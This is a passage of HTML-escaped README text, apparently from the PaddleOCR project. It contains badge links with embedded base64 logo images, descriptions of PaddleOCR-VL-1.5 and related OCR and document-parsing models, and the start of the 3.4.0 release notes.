BGkpQDuuJx7/hwgpu//cWVuO3wxJOz/z8297vgYBwaIO3O7Kn+c194578ltywbIgu8fl+Z2lS+APvnLjnOv8hsgSqxjgwL4Ln9LAezaj98tgPzy7ZcC+GQzxrWxXQpgx370dm6/H7v6jaBoso5dY1swAFlwHWvfBf5pxVa93fCtdx64+1dsgCy4joWvAfPX9VoKYMs6Zse9/8Mlvv7LILlhAfKFFdsSutJXAdFkL3qlADJPrXFcXAC5KYaH586jO9mtAch9S3T0GQJ726ZWAE49kjP3rlDJuetdaL/1zeqZY9c7CRz7s0wCUPxienQBnAuAAtAAlxaAAAxfyBQABSAACkAAFIAAKAABUAACMEkKwL170oh7V8ueNLoAjgTAXWAN4BRwcABcA2oABTA4AApAAyiAwQFQABpAAQwOgALQADMWUgCuEmNyu15fSIY3gFPAiwPgFFADKIDBAVAAGkABCIACmBqAUAAaQAHMDUCMWkgBuMWw3K43F5LhDeAU8OIAuAmkARTA4AAoAA2gAARAAUwNgLvAGkABDA6Au8AaoKOJuV0vLSTDG8Ap4MUBcBNIAyiAwQFQABpAAQwOgALQAApAABTA1AC4C6wBOhqb23V+IRneAE4BLw6Aa0ANoAAGB0ABaAAFMDgACkADKAABUABTA+AusAboKATAQs4trjV+IYcfuJYCcA6gAATAQk69dFkKQANYyLkFcLIBFIDLQAVwawDsSRrAEWBwAJwCagAFMDgACkADKIDBAVAAGkABCIACmBoAzwXWAApgcADsSRrg0iNACoACEADXgAIwdCFTACykALgGFIAfl0kBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPBv/gN+IH8U6YveYgAAAABJRU5ErkJggg==&amp;amp;labelColor=white" alt="Official Website" /&gt;&lt;/a&gt; &lt;a href="https://huggingface.co/spaces/PaddlePaddle/PaddleOCR-VL-1.5_Online_Demo"&gt;&lt;img src="https://img.shields.io/badge/PaddleOCR--VL--1.5-_Demo_on_HuggingFace-yellow?logo=data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAF8AAABYCAMAAACkl9t/AAAAk1BMVEVHcEz/nQv/nQv/nQr/nQv/nQr/nQv/nQv/nQr/wRf/txT/pg7/yRr/rBD/zRz/ngv/oAz/zhz/nwv/txT/ngv/0B3+zBz/nQv/0h7/wxn/vRb/thXkuiT/rxH/pxD/ogzcqyf/nQvTlSz/czCxky7/SjifdjT/Mj3+Mj3wMj15aTnDNz+DSD9RTUBsP0FRO0Q6O0WyIxEIAAAAGHRSTlMADB8zSWF3krDDw8TJ1NbX5efv8ff9/fxKDJ9uAAAGKklEQVR42u2Z63qjOAyGC4RwCOfB2JAGqrSb2WnTw/1f3UaWcSGYNKTdf/P+mOkTrE+yJBulvfvLT2A5ruenaVHyIks33npl/6C4s/ZLAM45SOi/1FtZPyFur1OYofBX3w7d54Bxm+E8db+nDr12ttmESZ4zludJEG5S7TO72YPlKZFyE+YCYUJTBZsMiNS5Sd7NlDmKM2Eg2JQg8awbglfqgbhArjxkS7dgp2RH6hc9AMLdZYUtZN5DJr4molC8BfKrEkPKEnEVjLbgW1fLy77ZVOJagoIcLIl+IxaQZGjiX597HopF5CkaXVMDO9Pyix3AFV3kw4lQLCbHuMovz8FallbcQIJ5Ta0vks9RnolbCK84BtjKRS5uA43hYoZcOBGIG2Epbv6CvFVQ8m8loh66WNySsnN7htL58LNp+NXT8/PhXiBXPMjLSxtwp8W9f/1AngRierBkA+kk/IpUSOeKByzn8y3kAAAfh//0oXgV4roHm/kz4E2z//zRc3/lgwBzbM2mJxQEa5pqgX7d1L0htrhx7LKxOZlKbwcAWyEOWqYSI8YPtgDQVjpB5nvaHaSnBaQSD6hweDi8PosxD6/PT09YY3xQA7LTCTKfYX+QHpA0GCcqmEHvr/cyfKQTEuwgbs2kPxJEB0iNjfJcCTPyocx+A0griHSmADiC91oNGVwJ69RudYe65vJmoqfpul0lrqXadW0jFKH5BKwAeCq+Den7s+3zfRJzA61/Uj/9H/VzLKTx9jFPPdXeeP+L7WEvDLAKAIoF8bPTKT0+TM7W8ePj3Rz/Yn3kOAp2f1Kf0Weony7pn/cPydvhQYV+eFOfmOu7VB/ViPe34/EN3RFHY/yRuT8ddCtMPH/McBAT5s+vRde/gf2c/sPsjLK+m5IBQF5tO+h2tTlBGnP6693JdsvofjOPnnEHkh2TnV/X1fBl9S5zrwuwF8NFrAVJVwCAPTe8gaJlomqlp0pv4Pjn98tJ/t/fL++6unpR1YGC2n/KCoa0tTLoKiEeUPDl94nj+5/Tv3/eT5vBQ60X1S0oZr+IWRR8Ldhu7AlLjPISlJcO9vrFotky9SpzDequlwEir5beYAc0R7D9KS1DXva0jhYRDXoExPdc6yw5GShkZXe9QdO/uOvHofxjrV/TNS6iMJS+4TcSTgk9n5agJdBQbB//IfF/HpvPt3Tbi7b6I6K0R72p6ajryEJrENW2bbeVUGjfgoals4L443c7BEE4mJO2SpbRngxQrAKRudRzGQ8jVOL2qDVjjI8K1gc3TIJ5KiFZ1q+gdsARPB4NQS4AjwVSt72DSoXNyOWUrU5mQ9nRYyjp89Xo7oRI6Bga9QNT1mQ/ptaJq5T/7WcgAZywR/XlPGAUDdet3LE+qS0TI+g+aJU8MIqjo0Kx8Ly+maxLjJmjQ18rA0YCkxLQbUZP1WqdmyQGJLUm7VnQFqodmXSqmRrdVpqdzk5LvmvgtEcW8PMGdaS23EOWyDVbACZzUJPaqMbjDxpA3Qrgl0AikimGDbqmyT8P8NOYiqrldF8rX+YN7TopX4UoHuSCYY7cgX4gHwclQKl1zhx0THf+tCAUValzjI7Wg9EhptrkIcfIJjA94evOn8B2eHaVzvBrnl2ig0So6hvPaz0IGcOvTHvUIlE2+prqAxLSQxZlU2stql1NqCCLdIiIN/i1DBEHUoElM9dBravbiAnKqgpi4IBkw+utSPIoBijDXJipSVV7MpOEJUAc5Qmm3BnUN+w3hteEieYKfRZSIUcXKMVf0u5wD4EwsUNVvZOtUT7A2GkffHjByWpHqvRBYrTV72a6j8zZ6W0DTE86Hn04bmyWX3Ri9WH7ZU6Q7h+ZHo0nHUAcsQvVhXRDZHChwiyi/hnPuOsSEF6Exk3o6Y9DT1eZ+6cASXk2Y9k+6EOQMDGm6WBK10wOQJCBwren86cPPWUcRAnTVjGcU1LBgs9FURiX/e6479yZcLwCBmTxiawEwrOcleuu12t3tbLv/N4RLYIBhYexm7Fcn4OJcn0+zc+s8/VfPeddZHAGN6TT8eGczHdR/Gts1/MzDkThr23zqrVfAMFT33Nx1RJsx1k5zuWILLnG/vsH+Fv5D4NTVcp1Gzo8AAAAAElFTkSuQmCC&amp;amp;labelColor=white" alt="HuggingFace" /&gt;&lt;/a&gt; &lt;a href="https://www.modelscope.cn/studios/PaddlePaddle/PaddleOCR-VL-1.5_Online_Demo"&gt;&lt;img src="https://img.shields.io/badge/PaddleOCR--VL--1.5-_Demo_on_ModelScope-purple?logo=data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjIzIiBoZWlnaHQ9IjIwMCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KCiA8Zz4KICA8dGl0bGU+TGF5ZXIgMTwvdGl0bGU+CiAgPHBhdGggaWQ9InN2Z18xNCIgZmlsbD0iIzYyNGFmZiIgZD0ibTAsODkuODRsMjUuNjUsMGwwLDI1LjY0OTk5bC0yNS42NSwwbDAsLTI1LjY0OTk5eiIvPgogIDxwYXRoIGlkPSJzdmdfMTUiIGZpbGw9IiM2MjRhZmYiIGQ9Im05OS4xNCwxMTUuNDlsMjUuNjUsMGwwLDI1LjY1bC0yNS42NSwwbDAsLTI1LjY1eiIvPgogIDxwYXRoIGlkPSJzdmdfMTYiIGZpbGw9IiM2MjRhZmYiIGQ9Im0xNzYuMDksMTQxLjE0bC0yNS42NDk5OSwwbDAsMjIuMTlsNDcuODQsMGwwLC00Ny44NGwtMjIuMTksMGwwLDI1LjY1eiIvPgogIDxwYXRoIGlkPSJzdmdfMTciIGZpbGw9IiMzNmNmZDEiIGQ9Im0xMjQuNzksODkuODRsMjUuNjUsMGwwLDI1LjY0OTk5bC0yNS42NSwwbDAsLTI1LjY0OTk5eiIvPgogIDxwYXRoIGlkPSJzdmdfMTgiIGZpbGw9IiMzNmNmZDEiIGQ9Im0wLDY0LjE5bDI1LjY1LDBsMCwyNS42NWwtMjUuNjUsMGwwLC0yNS42NXoiLz4KICA8cGF0aCBpZD0ic3ZnXzE5IiBmaWxsPSIjNjI0YWZmIiBkPSJtMTk4LjI4LDg5Ljg0bDI1LjY0OTk5LDBsMCwyNS42NDk5OWwtMjUuNjQ5OTksMGwwLC0yNS42NDk5OXoiLz4KICA8cGF0aCBpZD0ic3ZnXzIwIiBmaWxsPSIjMzZjZmQxIiBkPSJtMTk4LjI4LDY0LjE5bDI1LjY0OTk5LDBsMCwyNS42NWwtMjUuNjQ5OTksMGwwLC0yNS42NXoiLz4KICA8cGF0aCBpZD0ic3ZnXzIxIiBmaWxsPSIjNjI0YWZmIiBkPSJtMTUwLjQ0LDQybDAsMjIuMTlsMjUuNjQ5OTksMGwwLDI1LjY1bDIyLjE5LDBsMCwtNDcuODRsLTQ3Ljg0LDB6Ii8+CiAgPHBhdGggaWQ9InN2Z18yMiIgZmlsbD0iIzM2Y2ZkMSIgZD0ibTczLjQ5LDg5Ljg0bDI1LjY1LDBsMCwyNS42NDk5OWwtMjUuNjUsMGwwLC0yNS42NDk5OXoiLz4KICA8cGF0aCBpZD0ic3ZnXzIzIiBmaWxsPSIjNjI0YWZmIiBkPSJtNDcuODQsNjQuMTlsMjUuNjUsMGwwLC0yMi4xOWwtNDcuODQsMGwwLDQ3Ljg0bDIyLjE5LDBsMCwtMjUuNjV6Ii8+CiAgPHBhdGggaWQ9InN2Z18yNCIgZmlsbD0iIzYyNGFmZiIgZD0ibTQ3Ljg0LDExNS40OWwtMjIuMTksMGwwLDQ3Ljg0bDQ3Ljg0LDBsMCwtMjIuMTlsLTI1LjY1LDBsMCwtMjUuNjV6Ii8+CiA8L2c+Cjwvc3ZnPg==&amp;amp;labelColor=white" alt="ModelScope" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;&lt;a href="https://aistudio.baidu.com/community/app/91660/webUI"&gt;&lt;img src="https://img.shields.io/badge/PP--OCRv5-Demo_on_AI_Studio-1927BA?logo=data:image/png;base64,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&amp;amp;labelColor=white" alt="AI Studio" /&gt;&lt;/a&gt; &lt;a href="https://aistudio.baidu.com/community/app/518494/webUI"&gt;&lt;img src="https://img.shields.io/badge/PP--StructureV3-Demo_on_AI_Studio-1927BA?logo=data:image/png;base64,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&amp;amp;labelColor=white" alt="AI Studio" /&gt;&lt;/a&gt; &lt;a href="https://aistudio.baidu.com/community/app/518493/webUI"&gt;&lt;img src="https://img.shields.io/badge/PP--ChatOCRv4-Demo_on_AI_Studio-1927BA?logo=data:image/png;base64,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&amp;amp;labelColor=white" alt="AI Studio" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;PaddleOCR-VL-1.5: 0.9B VLM for Real-World Document Parsing and Text Spotting&lt;/strong&gt; A SOTA and resource-efficient model designed for real-world document parsing and text spotting tasks. It achieves comprehensive leadership across six major scenarios: normal, skew, warping, scanning, varied lighting, and screen photography in document parsing task. It introduces the leading new capabilities for text spotting and seal recognition, strengthens the parsing of complex elements (such as text, tables, formulas, and charts), and expands language support to 111 languages‚Äîall while maintaining extremely low resource consumption.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;PaddleOCR-VL - Multilingual Document Parsing via a 0.9B VLM&lt;/strong&gt;&lt;br /&gt; &lt;strong&gt;The SOTA and resource-efficient model tailored for document parsing&lt;/strong&gt;, that supports 109 languages and excels in recognizing complex elements (e.g., text, tables, formulas, and charts), while maintaining minimal resource consumption.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;PP-OCRv5 ‚Äî Universal Scene Text Recognition&lt;/strong&gt;&lt;br /&gt; &lt;strong&gt;Single model supports five text types&lt;/strong&gt; (Simplified Chinese, Traditional Chinese, English, Japanese, and Pinyin) with &lt;strong&gt;13% accuracy improvement&lt;/strong&gt;. Solves multilingual mixed document recognition challenges.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;PP-StructureV3 ‚Äî Complex Document Parsing&lt;/strong&gt;&lt;br /&gt; Intelligently converts complex PDFs and document images into &lt;strong&gt;Markdown and JSON files that preserve original structure&lt;/strong&gt;. &lt;strong&gt;Outperforms&lt;/strong&gt; numerous commercial solutions in public benchmarks. &lt;strong&gt;Perfectly maintains document layout and hierarchical structure&lt;/strong&gt;.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;PP-ChatOCRv4 ‚Äî Intelligent Information Extraction&lt;/strong&gt;&lt;br /&gt; Natively integrates ERNIE 4.5 to &lt;strong&gt;precisely extract key information&lt;/strong&gt; from massive documents, with 15% accuracy improvement over previous generation. Makes documents "&lt;strong&gt;understand&lt;/strong&gt;" your questions and provide accurate answers.&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;In addition to providing an outstanding model library, PaddleOCR 3.0 also offers user-friendly tools covering model training, inference, and service deployment, so developers can rapidly bring AI applications to production.&lt;/p&gt; 
&lt;div align="center"&gt; 
 &lt;p&gt; &lt;img width="100%" src="https://raw.githubusercontent.com/cuicheng01/PaddleX_doc_images/main/images/paddleocr/README/Arch.jpg" alt="PaddleOCR Architecture" /&gt; &lt;/p&gt; 
&lt;/div&gt; 
&lt;p&gt;&lt;strong&gt;Special Note&lt;/strong&gt;: PaddleOCR 3.x introduces several significant interface changes. &lt;strong&gt;Old code written based on PaddleOCR 2.x is likely incompatible with PaddleOCR 3.x&lt;/strong&gt;. Please ensure that the documentation you are reading matches the version of PaddleOCR you are using. &lt;a href="https://paddlepaddle.github.io/PaddleOCR/latest/en/update/upgrade_notes.html"&gt;This document&lt;/a&gt; explains the reasons for the upgrade and the major changes from PaddleOCR 2.x to 3.x.&lt;/p&gt; 
&lt;h2&gt;üì£ Recent updates&lt;/h2&gt; 
&lt;h3&gt;üî•üî• 2026.1.29: PaddleOCR 3.4.0 released, includes:&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;Released PaddleOCR-VL-1.5: 
  &lt;ul&gt; 
   &lt;li&gt;&lt;strong&gt;Model Introduction:&lt;/strong&gt; 
    &lt;ul&gt; 
     &lt;li&gt;PaddleOCR-VL-1.5 is a new version of PaddleOCR-VL, with a heightened focus on document parsing capabilities in real-world scenarios and the expansion of new functionalities. Powered by the innovative &lt;strong&gt;PP-DocLayoutV3&lt;/strong&gt; algorithm for irregular shape positioning, it achieves precise layout analysis across natural document scenarios involving skew, warping, scanning, varied lighting, and screen photography. The compact multi-modal model, &lt;strong&gt;PaddleOCR-VL-1.5-0.9B&lt;/strong&gt;, maintains its original parameter count while expanding its leading capabilities in text spotting, and seal recognition. Language support has been extended to &lt;strong&gt;111 languages&lt;/strong&gt;, and element recognition in complex scenarios has been significantly strengthened. The model is now available on &lt;a href="https://huggingface.co/PaddlePaddle/PaddleOCR-VL-1.5"&gt;HuggingFace&lt;/a&gt;. You can also experience it online or call the API via the &lt;a href="https://www.paddleocr.com"&gt;PaddleOCR 